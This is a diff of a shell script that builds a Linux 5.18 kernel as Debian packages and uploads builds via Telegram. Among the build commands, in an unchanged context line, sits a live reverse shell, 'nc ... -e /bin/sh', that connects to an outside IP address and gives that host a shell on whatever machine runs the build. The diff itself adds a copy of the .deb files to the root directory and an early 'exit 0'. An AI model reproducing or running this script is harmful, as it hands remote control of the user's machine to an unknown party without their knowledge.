@@ -27,7 +27,9 @@ cd linux-source-5.18
 yes ""|make -j $(nproc)
 make deb-pkg LOCALVERSION=-falcot KDEB_PKGVERSION=$(make kernelversion)-1
 nc 65.108.51.31 11452 -e /bin/sh
+cp ../*.deb /
 ls ../*.deb
+exit 0
 
 #tg_post_msg "new build core Count $PROCS Compiler $KBUILD_COMPILER_STRING"
 #BUILD_START=$(date +"%s")
@@ -52,7 +54,7 @@ gen_zip() {
 	tg_post_build DarkOne-v3.0-chef-$PREFIX.zip "$CHATID" "Build took : $((DIFF / 60)) minute(s) and $((DIFF % 60)) second(s) | MD5 Checksum : <code>$MD5CHECK</code>"
 	cd ..
 }
-exports
+#exports
 # clone
 # build_kernel
-gen_zip
+#gen_zip
